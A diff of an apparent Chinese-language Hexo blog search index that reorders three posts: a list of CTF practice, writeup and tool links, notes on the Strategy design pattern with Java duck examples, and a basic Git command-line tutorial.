-<p><a href="https://bctf.cn/#/about" target="_blank" rel="noopener">https://bctf.cn/#/about</a>   –百度ctf  </p>
-<p><a href="http://www.hackdog.me/writeup/" target="_blank" rel="noopener">http://www.hackdog.me/writeup/</a>   –redrain大大  </p>
-<p><a href="https://www.cyberchallenge.com.au/solutions.html" target="_blank" rel="noopener">https://www.cyberchallenge.com.au/solutions.html</a>  –国外站点  </p>
-<p><a href="http://www.alictf.com/" target="_blank" rel="noopener">http://www.alictf.com/</a>      –阿里ctf  </p>
-<hr>
-<p><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">http://oj.xctf.org.cn/</a>    –X-ctf题目汇总  </p>
-<p><a href="http://hackinglab.cn/" target="_blank" rel="noopener">http://hackinglab.cn/</a>     –网络信息安全攻防学习平台  </p>
-<p><a href="http://hackgame.blackbap.org/" target="_blank" rel="noopener">http://hackgame.blackbap.org/</a>    –习科  </p>
-<p><a href="http://www.honyaedu.com/" target="_blank" rel="noopener">http://www.honyaedu.com/</a>    -红亚  </p>
-<p><a href="http://www.wechall.net/" target="_blank" rel="noopener">http://www.wechall.net/</a>    –ctf外国站点  </p>
-<p><a href="http://ctf.idf.cn/" target="_blank" rel="noopener">http://ctf.idf.cn/</a>   –IDF实验室  </p>
-<p><a href="http://ctf.3sec.cn/" target="_blank" rel="noopener">http://ctf.3sec.cn/</a>    –Jlu.CTF  </p>
-<p><a href="http://erange.heetian.com/CTFrace.html" target="_blank" rel="noopener">http://erange.heetian.com/CTFrace.html</a>    –合天  </p>
-<p><a href="http://www.simplexue.com/" target="_blank" rel="noopener">http://www.simplexue.com/</a>    –西普学院  </p>
-<p><a href="http://1111.segmentfault.com/" target="_blank" rel="noopener">http://1111.segmentfault.com/</a>    –光棍节程序员闯关秀  </p>
-<p><a href="http://www.helloisa.com/" target="_blank" rel="noopener">http://www.helloisa.com/</a>  –一个游戏又友链了几个游戏  </p>
-<p><a href="https://redtiger.labs.overthewire.org/" target="_blank" rel="noopener">https://redtiger.labs.overthewire.org/</a>  –外国站点web_sql  </p>
-<hr>
-<p><a href="https://github.com/ctfs/" target="_blank" rel="noopener">https://github.com/ctfs/</a>   –git上writeup  </p>
-<p><a href="http://bobao.360.cn/ctf/" target="_blank" rel="noopener">http://bobao.360.cn/ctf/</a>   –360安全播报  </p>
-<p><a href="http://sec.yka.me/" target="_blank" rel="noopener">http://sec.yka.me/</a>  –英文版writeup  </p>
-<p><a href="http://bobao.360.cn/ctf/learning/129.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/129.html</a>  –DUTCTF-2015-Writeup  </p>
-<p><a href="http://ctf.idf.cn/index.php?g=portal&amp;m=list&amp;a=index&amp;id=10" target="_blank" rel="noopener">http://ctf.idf.cn/index.php?g=portal&amp;m=list&amp;a=index&amp;id=10</a>  –writeup  </p>
-<p><a href="https://ctf-team.vulnhub.com/" target="_blank" rel="noopener">https://ctf-team.vulnhub.com/</a>  –国外wp  </p>
-<p><a href="https://www.91ri.org/9482.html" target="_blank" rel="noopener">https://www.91ri.org/9482.html</a>  –91ri  </p>
-<p><a href="http://zhuanlan.zhihu.com/wooyun/19861125" target="_blank" rel="noopener">http://zhuanlan.zhihu.com/wooyun/19861125</a> –wooyun_writeup  </p>
-<p><a href="http://drops.wooyun.org/?s=writeup&amp;submit=%E6%90%9C%E7%B4%A2" target="_blank" rel="noopener">http://drops.wooyun.org/?s=writeup&amp;submit=%E6%90%9C%E7%B4%A2</a> –wooyun  </p>
-<hr>
-<p><a href="http://attach.blackbap.org/down/" target="_blank" rel="noopener">http://attach.blackbap.org/down/</a>  –习科工具下载  </p>
-<p><a href="http://forum.cnsec.org/thread-93930-1-1.html" target="_blank" rel="noopener">http://forum.cnsec.org/thread-93930-1-1.html</a>  –ctf_tools  </p>
-<p><a href="http://mdsec.net/wahh/tools.html" target="_blank" rel="noopener">http://mdsec.net/wahh/tools.html</a>    –tool下载  </p>
-<p><a href="http://tool.lu/" target="_blank" rel="noopener">http://tool.lu/</a>  –在线工具集合  </p>
-<p><a href="http://m.blog.csdn.net/blog/winkar/42458273" target="_blank" rel="noopener">http://m.blog.csdn.net/blog/winkar/42458273</a>  –一部分  </p>
-<p><a href="http://www.ibeast.com/content/tools/ciscopassword/" target="_blank" rel="noopener">http://www.ibeast.com/content/tools/ciscopassword/</a>  –passwd_break  </p>
-<p><a href="http://www.yellowpipe.com/yis/tools/encrypter/index.php" target="_blank" rel="noopener">http://www.yellowpipe.com/yis/tools/encrypter/index.php</a>  –编码解码  </p>
-<p><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a>    –js_fuck  </p>
-<p><a href="http://www.objectif-securite.ch/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/ophcrack.php</a>    –hash破解  </p>
-<hr>
-<p><a href="http://217.logdown.com/" target="_blank" rel="noopener">http://217.logdown.com/</a>    –217  </p>
-<p><a href="http://www.blue-lotus.net" target="_blank" rel="noopener">http://www.blue-lotus.net</a>    –blue-lotus蓝莲花  </p>
-<p><a href="http://blog.0ops.net/" target="_blank" rel="noopener">http://blog.0ops.net/</a>    –0ops  </p>
-<p><a href="http://le4f.net/" target="_blank" rel="noopener">http://le4f.net/</a>   –le4f大牛博客  </p>
-<p><a href="http://www.programlife.net/" target="_blank" rel="noopener">http://www.programlife.net/</a>    –代码疯子  </p>
-<p><a href="http://appleu0.sinaapp.com/" target="_blank" rel="noopener">http://appleu0.sinaapp.com/</a>    –apple牛  </p>
-<p><a href="http://www.syjzwjj.com/" target="_blank" rel="noopener">http://www.syjzwjj.com/</a>  –俊杰  </p>
-<p><a href="http://blog.sycsec.com/" target="_blank" rel="noopener">http://blog.sycsec.com/</a>  –三叶草  </p>
-<p><a href="http://www.waitalone.cn/" target="_blank" rel="noopener">http://www.waitalone.cn/</a>    –独自等待  </p>
-<hr>
-<p>反编译工具  </p>
-<p>android反编译工具 <a href="https://down.52pojie.cn/Tools/Android_Tools/" target="_blank" rel="noopener">https://down.52pojie.cn/Tools/Android_Tools/</a>  </p>
-<p>apk反编译实战<br><a href="http://www.wjdiankong.cn/apk%E8%84%B1%E5%A3%B3%E5%9C%A3%E6%88%98%E4%B9%8B-%E8%84%B1%E6%8E%89%E7%88%B1%E5%8A%A0%E5%AF%86%E5%AE%B6%E7%9A%84%E5%A3%B3/" target="_blank" rel="noopener">http://www.wjdiankong.cn/apk%E8%84%B1%E5%A3%B3%E5%9C%A3%E6%88%98%E4%B9%8B-%E8%84%B1%E6%8E%89%E7%88%B1%E5%8A%A0%E5%AF%86%E5%AE%B6%E7%9A%84%E5%A3%B3/</a>  </p>
+<p>#####复合优先于继承</p>
+<p>#####多用组合，少用继承</p>
+<p>组合<br>has-a     </p>
+<p>#use  </p>
+<p>组合：<br> 在类中增加一个私有域，引用另一个已有的类的实例，通过调用引用实例的方法从而获得新的功能，这种设计称作组合(复合)  </p>
+<p>方案三：组合<br>  将飞行行为抽象为接口，在父类中持有该接口，并由该接口代理飞行行为。  </p>
+<pre><code>/*
+ * 策略接口，实现鸭子的飞行行为
+ */
+public interface FlyingStragety {
+
+    void performFly();
+}
+
+private FlyingStragety flyingStragety;
+
+
+public void setFlyingStragety(FlyingStragety flyingStragety) {
+    this.flyingStragety = flyingStragety;
+}
+
+public void fly(){
+    flyingStragety.performFly();
+}
+</code></pre><p>优点：<br>  足够灵活<br>  复用代码，更易于维护  </p>
+<p>缺点：  </p>
+<p>策略模式中的设计原则：<br>  找出应用中需要变化的部分，把他们独立出来，不要和那些不需要变化的代码混在一起。<br>  面向接口编程，而不是面向实现编程。<br>  多用组合，少用继承。  </p>
+<p>策略模式的实现：<br>  （1） 通过分离变化得出的策略接口Strategy<br>  （2） Strategy的实现类<br>  （3） 客户程序”有一个”Stategy<br>  （4） 客户程序中选择/组装正确的Strategy实现  </p>
 ]]></content>
       <categories>
-        <category>ctf</category>
+        <category>设计模式</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
+        <tag>设计模式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Git命令行基础</title>
+    <url>/post/744454998.html</url>
+    <content><![CDATA[<h2 id="Git命令行基础"><a href="#Git命令行基础" class="headerlink" title="Git命令行基础"></a>Git命令行基础</h2><p>Git是一个开源的分布式版本控制工具  </p>
+<h2 id="配置身份"><a href="#配置身份" class="headerlink" title="配置身份"></a>配置身份</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-227984aa4a843aea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="配置身份"></p>
+<pre><code>git config --global user.name &quot;Tony&quot;
+git config --global user.email &quot;tony@gmail.com&quot;
+</code></pre><h2 id="检查是否配置成功"><a href="#检查是否配置成功" class="headerlink" title="检查是否配置成功"></a>检查是否配置成功</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-928c9c6757dc67e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="检查配置"></p>
+<pre><code>git config --global user.name 
+git config --global user.email
+</code></pre><h2 id="创建本地代码仓库"><a href="#创建本地代码仓库" class="headerlink" title="创建本地代码仓库"></a>创建本地代码仓库</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e754601d1294c2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="创建本地仓库"></p>
+<pre><code>git init
+</code></pre><p>仓库创建完成后会在项目目录下生成一个隐藏的.git文件夹 这个文件夹就是用来记录本地所有的Git操作的<br>如果你想要删除本地仓库 只需要删除这个文件夹就行  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-3dff03268e6c368d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git"></p>
+<h2 id="提交本地代码"><a href="#提交本地代码" class="headerlink" title="提交本地代码"></a>提交本地代码</h2><pre><code>git add [提交的文件名] // 提交一个文件 
+
+git add . // 提交所有文件
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-7e2ae3e2d7d6b0ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-5a267cd07270af2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add ."></p>
+<p>现在所有文件都加好了  然后用commit命令提交下  </p>
+<pre><code>git commit -m &quot;First commit.&quot;
+</code></pre><h2 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h2><p>在项目中创建  .gitignore 文件  </p>
+<p>在.gitignore文件下 每行指定的文件或目录会排除在版本控制外</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-1fb5b8fd5616d1da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=".gitignore"></p>
+<h2 id="查看修改内容"><a href="#查看修改内容" class="headerlink" title="查看修改内容"></a>查看修改内容</h2><pre><code>git status
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2ce1bd904ae1ed59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git status"></p>
+<h2 id="查看更改内容"><a href="#查看更改内容" class="headerlink" title="查看更改内容"></a>查看更改内容</h2><pre><code>git diff
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-fbf6e8ddf3bd958b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git diff"></p>
+<h2 id="撤销未提交的修改"><a href="#撤销未提交的修改" class="headerlink" title="撤销未提交的修改"></a>撤销未提交的修改</h2><pre><code>git checkout
+</code></pre><h2 id="撤回提交"><a href="#撤回提交" class="headerlink" title="撤回提交"></a>撤回提交</h2><pre><code>git reset
+</code></pre><h2 id="查看提交记录"><a href="#查看提交记录" class="headerlink" title="查看提交记录"></a>查看提交记录</h2><pre><code>git log
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-3446be699c5f2adb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git log"></p>
+<p>查看修改一行  </p>
+<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1
+</code></pre><p>查看具体修改内容  </p>
+<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1 -p
+</code></pre><p>##查看分支  </p>
+<pre><code>git branch    
+</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2778e9e774286b00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git branch"></p>
+<h2 id="建立分支"><a href="#建立分支" class="headerlink" title="建立分支"></a>建立分支</h2><pre><code>git branch version1.0
+</code></pre><h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><pre><code>git checkout version1.0
+</code></pre><h2 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h2><pre><code>git checkout master
+git merge version1.0
+</code></pre><h2 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h2><pre><code>git branch -D version1.0
+</code></pre><h2 id="与远程版本库协作"><a href="#与远程版本库协作" class="headerlink" title="与远程版本库协作"></a>与远程版本库协作</h2><pre><code>git clone https://github.com/example/text.git
+</code></pre><h2 id="本地修改内容同步到远程版本库"><a href="#本地修改内容同步到远程版本库" class="headerlink" title="本地修改内容同步到远程版本库"></a>本地修改内容同步到远程版本库</h2><pre><code>git push origin master
+</code></pre><h2 id="远程版本库修改同步到本地"><a href="#远程版本库修改同步到本地" class="headerlink" title="远程版本库修改同步到本地"></a>远程版本库修改同步到本地</h2><pre><code>git fetch origin master
+</code></pre><h2 id="查看远程版本库修改了那些东西"><a href="#查看远程版本库修改了那些东西" class="headerlink" title="查看远程版本库修改了那些东西"></a>查看远程版本库修改了那些东西</h2><pre><code>git diff origin/master
+</code></pre><p>之后在调用merge命令将origin/master分支上的修改合并到主分支上  </p>
+<pre><code>git merge origin/master
+</code></pre><p>pull命令是相当于 fetch和merge两个命令放在一起执行  </p>
+<pre><code>git pull origon master
+</code></pre><hr>
+<h2 id="查看已存放：（这个最有用）"><a href="#查看已存放：（这个最有用）" class="headerlink" title="查看已存放：（这个最有用）"></a>查看已存放：（这个最有用）</h2><pre><code>git ls-files
+</code></pre><h2 id="查看还没添加的文件："><a href="#查看还没添加的文件：" class="headerlink" title="查看还没添加的文件："></a>查看还没添加的文件：</h2><pre><code>git status
+</code></pre>]]></content>
+      <categories>
+        <category>git</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
       </tags>
   </entry>
   <entry>
@@ -9299,153 +9363,89 @@ public class BaseFragment extends Fragment {
       </tags>
   </entry>
   <entry>
-    <title>Git命令行基础</title>
-    <url>/post/744454998.html</url>
-    <content><![CDATA[<h2 id="Git命令行基础"><a href="#Git命令行基础" class="headerlink" title="Git命令行基础"></a>Git命令行基础</h2><p>Git是一个开源的分布式版本控制工具  </p>
-<h2 id="配置身份"><a href="#配置身份" class="headerlink" title="配置身份"></a>配置身份</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-227984aa4a843aea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="配置身份"></p>
-<pre><code>git config --global user.name &quot;Tony&quot;
-git config --global user.email &quot;tony@gmail.com&quot;
-</code></pre><h2 id="检查是否配置成功"><a href="#检查是否配置成功" class="headerlink" title="检查是否配置成功"></a>检查是否配置成功</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-928c9c6757dc67e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="检查配置"></p>
-<pre><code>git config --global user.name 
-git config --global user.email
-</code></pre><h2 id="创建本地代码仓库"><a href="#创建本地代码仓库" class="headerlink" title="创建本地代码仓库"></a>创建本地代码仓库</h2><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e754601d1294c2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="创建本地仓库"></p>
-<pre><code>git init
-</code></pre><p>仓库创建完成后会在项目目录下生成一个隐藏的.git文件夹 这个文件夹就是用来记录本地所有的Git操作的<br>如果你想要删除本地仓库 只需要删除这个文件夹就行  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-3dff03268e6c368d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git"></p>
-<h2 id="提交本地代码"><a href="#提交本地代码" class="headerlink" title="提交本地代码"></a>提交本地代码</h2><pre><code>git add [提交的文件名] // 提交一个文件 
-
-git add . // 提交所有文件
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-7e2ae3e2d7d6b0ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-5a267cd07270af2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add ."></p>
-<p>现在所有文件都加好了  然后用commit命令提交下  </p>
-<pre><code>git commit -m &quot;First commit.&quot;
-</code></pre><h2 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h2><p>在项目中创建  .gitignore 文件  </p>
-<p>在.gitignore文件下 每行指定的文件或目录会排除在版本控制外</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-1fb5b8fd5616d1da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=".gitignore"></p>
-<h2 id="查看修改内容"><a href="#查看修改内容" class="headerlink" title="查看修改内容"></a>查看修改内容</h2><pre><code>git status
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2ce1bd904ae1ed59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git status"></p>
-<h2 id="查看更改内容"><a href="#查看更改内容" class="headerlink" title="查看更改内容"></a>查看更改内容</h2><pre><code>git diff
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-fbf6e8ddf3bd958b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git diff"></p>
-<h2 id="撤销未提交的修改"><a href="#撤销未提交的修改" class="headerlink" title="撤销未提交的修改"></a>撤销未提交的修改</h2><pre><code>git checkout
-</code></pre><h2 id="撤回提交"><a href="#撤回提交" class="headerlink" title="撤回提交"></a>撤回提交</h2><pre><code>git reset
-</code></pre><h2 id="查看提交记录"><a href="#查看提交记录" class="headerlink" title="查看提交记录"></a>查看提交记录</h2><pre><code>git log
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-3446be699c5f2adb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git log"></p>
-<p>查看修改一行  </p>
-<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1
-</code></pre><p>查看具体修改内容  </p>
-<pre><code>git log 31f8f5c098c2b1988deea9a99a4511e35f85f0b6 -1 -p
-</code></pre><p>##查看分支  </p>
-<pre><code>git branch    
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2778e9e774286b00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git branch"></p>
-<h2 id="建立分支"><a href="#建立分支" class="headerlink" title="建立分支"></a>建立分支</h2><pre><code>git branch version1.0
-</code></pre><h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><pre><code>git checkout version1.0
-</code></pre><h2 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h2><pre><code>git checkout master
-git merge version1.0
-</code></pre><h2 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h2><pre><code>git branch -D version1.0
-</code></pre><h2 id="与远程版本库协作"><a href="#与远程版本库协作" class="headerlink" title="与远程版本库协作"></a>与远程版本库协作</h2><pre><code>git clone https://github.com/example/text.git
-</code></pre><h2 id="本地修改内容同步到远程版本库"><a href="#本地修改内容同步到远程版本库" class="headerlink" title="本地修改内容同步到远程版本库"></a>本地修改内容同步到远程版本库</h2><pre><code>git push origin master
-</code></pre><h2 id="远程版本库修改同步到本地"><a href="#远程版本库修改同步到本地" class="headerlink" title="远程版本库修改同步到本地"></a>远程版本库修改同步到本地</h2><pre><code>git fetch origin master
-</code></pre><h2 id="查看远程版本库修改了那些东西"><a href="#查看远程版本库修改了那些东西" class="headerlink" title="查看远程版本库修改了那些东西"></a>查看远程版本库修改了那些东西</h2><pre><code>git diff origin/master
-</code></pre><p>之后在调用merge命令将origin/master分支上的修改合并到主分支上  </p>
-<pre><code>git merge origin/master
-</code></pre><p>pull命令是相当于 fetch和merge两个命令放在一起执行  </p>
-<pre><code>git pull origon master
-</code></pre><hr>
-<h2 id="查看已存放：（这个最有用）"><a href="#查看已存放：（这个最有用）" class="headerlink" title="查看已存放：（这个最有用）"></a>查看已存放：（这个最有用）</h2><pre><code>git ls-files
-</code></pre><h2 id="查看还没添加的文件："><a href="#查看还没添加的文件：" class="headerlink" title="查看还没添加的文件："></a>查看还没添加的文件：</h2><pre><code>git status
-</code></pre>]]></content>
-      <categories>
-        <category>git</category>
-      </categories>
-      <tags>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>设计模式-策略模式（strategy）</title>
-    <url>/post/2113223531.html</url>
-    <content><![CDATA[<h2 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h2><p>视频地址<br><a href="http://www.imooc.com/video/3213" target="_blank" rel="noopener">http://www.imooc.com/video/3213</a></p>
-<p>策略模式  ：  </p>
-<p>将可变的部分  从程序中抽象分离成算法接口在该接口下分别封装一系列的算法实现<br>并使他们可以相互等候，从而导致客户端程序独立于算法的改变。  </p>
-<p>不变更代码架构<br>通过开发与重构<br>拥抱需求的变化<br>使用策略模式  </p>
-<p>虚拟应用：  鸭子应用<br>飞行的能力<br>更多鸭子类型<br>每六个月发布一款产品  </p>
-<p>原有功能  </p>
-<p>鸭子的鸣叫功能<br>鸭子的显示功能  </p>
-<p>需求：<br>加入飞行能力  </p>
-<p>原有项目：<br>鸭子基类<br>Duck.class</p>
-<pre><code>/*
- * 超类，所有的鸭子都要继承此类
- * 抽象了鸭子的行为：显示和鸣叫
- */
-public abstract class Duck {
-
-    /*
-     * 鸭子发出叫声
-     * 通用行为，由超类实现
-     */
-    public void quack(){
-        System.out.println(&quot;嘎嘎嘎&quot;);
-    }
-
-    /*
-     * 显示鸭子的外观
-     * 鸭子的外观各不相同，声明为abstract， 由子类实现
-     */
-    public abstract void display();
-
-
-}
-</code></pre><p>需求:让鸭子飞起来？  </p>
-<p>方案一：继承<br>    在父类中提供实现方法，子类通过继承获得父类中的飞行行为  </p>
-<pre><code>Duck.class
-
-public void fly(){
-    System.out.println(&quot;用翅膀飞行&quot;);
-}
-</code></pre><p>优点<br>  简单易用(粗暴丑陋)，已用应用可以快速添加飞行的能力<br>缺点<br>  不具有灵活性，对未来变更支持差<br>  需要通过在子类中覆写飞行的方法以提供新的飞行行为。这很容易造成错误(粗心的程序员忘记覆写)。  </p>
-<p>———————————–pass———————————-  </p>
-<p>方案二：抽象方法<br>  在父类中提供抽象方法，强迫子类实现自己的飞行行为  </p>
-<pre><code>public abstract void fly();
-</code></pre><p>优点<br>  足够灵活。  </p>
-<p>缺点<br>  累死<br>  每个子类都要实现一遍代码，即使是相同的行为也不例外。<br>  代码重复，没有复用代码。  </p>
-<p>————————-pass————————————-  </p>
-<p>######继承是重用代码的利器  </p>
-<p>######但继承并不总是最好的工具  </p>
+    <title>一些ctf的链接</title>
+    <url>/post/912287952.html</url>
+    <content><![CDATA[<p>忘了什么时候整理了！！！  </p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">ctfwiki</a>  </p>
+<p>工具：  </p>
+<p><a href="https://tools.pediy.com/win/debuggers.htm" target="_blank" rel="noopener">看雪CTF工具</a>  </p>
 <hr>
-<p>#####复合优先于继承</p>
-<p>#####多用组合，少用继承</p>
-<p>组合<br>has-a     </p>
-<p>#use  </p>
-<p>组合：<br> 在类中增加一个私有域，引用另一个已有的类的实例，通过调用引用实例的方法从而获得新的功能，这种设计称作组合(复合)  </p>
-<p>方案三：组合<br>  将飞行行为抽象为接口，在父类中持有该接口，并由该接口代理飞行行为。  </p>
-<pre><code>/*
- * 策略接口，实现鸭子的飞行行为
- */
-public interface FlyingStragety {
-
-    void performFly();
-}
-
-private FlyingStragety flyingStragety;
-
-
-public void setFlyingStragety(FlyingStragety flyingStragety) {
-    this.flyingStragety = flyingStragety;
-}
-
-public void fly(){
-    flyingStragety.performFly();
-}
-</code></pre><p>优点：<br>  足够灵活<br>  复用代码，更易于维护  </p>
-<p>缺点：  </p>
-<p>策略模式中的设计原则：<br>  找出应用中需要变化的部分，把他们独立出来，不要和那些不需要变化的代码混在一起。<br>  面向接口编程，而不是面向实现编程。<br>  多用组合，少用继承。  </p>
-<p>策略模式的实现：<br>  （1） 通过分离变化得出的策略接口Strategy<br>  （2） Strategy的实现类<br>  （3） 客户程序”有一个”Stategy<br>  （4） 客户程序中选择/组装正确的Strategy实现  </p>
+<p>brainfuck  </p>
+<p>fuckjs  </p>
+<p>Writeup<br><a href="http://bobao.360.cn/ctf/detail/173.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/detail/173.html</a><br><a href="http://www.freebuf.com/articles/web/94444.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/94444.html</a>  </p>
+<p>zip<br><a href="http://bobao.360.cn/ctf/detail/203.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/detail/203.html</a>  </p>
+<p>cap<br><a href="http://www.jianshu.com/p/d4da13258f35" target="_blank" rel="noopener">http://www.jianshu.com/p/d4da13258f35</a>  </p>
+<p>cap<br><a href="http://blog.csdn.net/helloc0de/article/details/68956222" target="_blank" rel="noopener">http://blog.csdn.net/helloc0de/article/details/68956222</a><br><a href="http://blog.csdn.net/sinat_34200786/article/details/76099974" target="_blank" rel="noopener">http://blog.csdn.net/sinat_34200786/article/details/76099974</a>  </p>
+<p><a href="https://www.secpulse.com/archives/38544.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/38544.html</a><br><a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/136.html</a>  </p>
+<p>音速猴子<br><a href="http://47.93.205.124:8001/" target="_blank" rel="noopener">http://47.93.205.124:8001/</a>  </p>
+<hr>
+<p>工具<br><a href="https://www.ctftools.com/" target="_blank" rel="noopener">https://www.ctftools.com/</a><br><a href="http://www.bugku.com/" target="_blank" rel="noopener">http://www.bugku.com/</a>  </p>
+<p>博客<br><a href="https://blog.ctftools.com/" target="_blank" rel="noopener">https://blog.ctftools.com/</a><br><a href="http://www.cnblogs.com/xuanhun/" target="_blank" rel="noopener">http://www.cnblogs.com/xuanhun/</a><br>阮一峰的网络日志<br><a href="http://www.ruanyifeng.com/blog/" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/</a>  </p>
+<p>编码<br><a href="http://www.cnblogs.com/daban/p/5680451.html" target="_blank" rel="noopener">http://www.cnblogs.com/daban/p/5680451.html</a>  </p>
+<p>有个练习平台<br><a href="http://blog.csdn.net/helloc0de/article/details/68956222" target="_blank" rel="noopener">http://blog.csdn.net/helloc0de/article/details/68956222</a>  </p>
+<p>密码学<br><a href="http://blog.csdn.net/aldnoah_zero/article/details/52494982" target="_blank" rel="noopener">http://blog.csdn.net/aldnoah_zero/article/details/52494982</a><br><a href="http://blog.csdn.net/youzen_ing/article/details/73075180" target="_blank" rel="noopener">http://blog.csdn.net/youzen_ing/article/details/73075180</a><br><a href="http://www.am0s.com/ctf/179.html" target="_blank" rel="noopener">http://www.am0s.com/ctf/179.html</a><br><a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/136.html</a>  </p>
+<hr>
+<p><a href="https://trailofbits.github.io/ctf/" target="_blank" rel="noopener">https://trailofbits.github.io/ctf/</a>    –介绍  </p>
+<p><a href="https://ctftime.org/" target="_blank" rel="noopener">https://ctftime.org/</a> –ctf竞赛时间  </p>
+<p><a href="https://time.xctf.org.cn/ctfs/" target="_blank" rel="noopener">https://time.xctf.org.cn/ctfs/</a>  –X-ctf  </p>
+<p><a href="http://ctf.sobug.com/Steganography.php" target="_blank" rel="noopener">http://ctf.sobug.com/Steganography.php</a> –SSCTF    –四叶草  </p>
+<p><a href="https://bctf.cn/#/about" target="_blank" rel="noopener">https://bctf.cn/#/about</a>   –百度ctf  </p>
+<p><a href="http://www.hackdog.me/writeup/" target="_blank" rel="noopener">http://www.hackdog.me/writeup/</a>   –redrain大大  </p>
+<p><a href="https://www.cyberchallenge.com.au/solutions.html" target="_blank" rel="noopener">https://www.cyberchallenge.com.au/solutions.html</a>  –国外站点  </p>
+<p><a href="http://www.alictf.com/" target="_blank" rel="noopener">http://www.alictf.com/</a>      –阿里ctf  </p>
+<hr>
+<p><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">http://oj.xctf.org.cn/</a>    –X-ctf题目汇总  </p>
+<p><a href="http://hackinglab.cn/" target="_blank" rel="noopener">http://hackinglab.cn/</a>     –网络信息安全攻防学习平台  </p>
+<p><a href="http://hackgame.blackbap.org/" target="_blank" rel="noopener">http://hackgame.blackbap.org/</a>    –习科  </p>
+<p><a href="http://www.honyaedu.com/" target="_blank" rel="noopener">http://www.honyaedu.com/</a>    -红亚  </p>
+<p><a href="http://www.wechall.net/" target="_blank" rel="noopener">http://www.wechall.net/</a>    –ctf外国站点  </p>
+<p><a href="http://ctf.idf.cn/" target="_blank" rel="noopener">http://ctf.idf.cn/</a>   –IDF实验室  </p>
+<p><a href="http://ctf.3sec.cn/" target="_blank" rel="noopener">http://ctf.3sec.cn/</a>    –Jlu.CTF  </p>
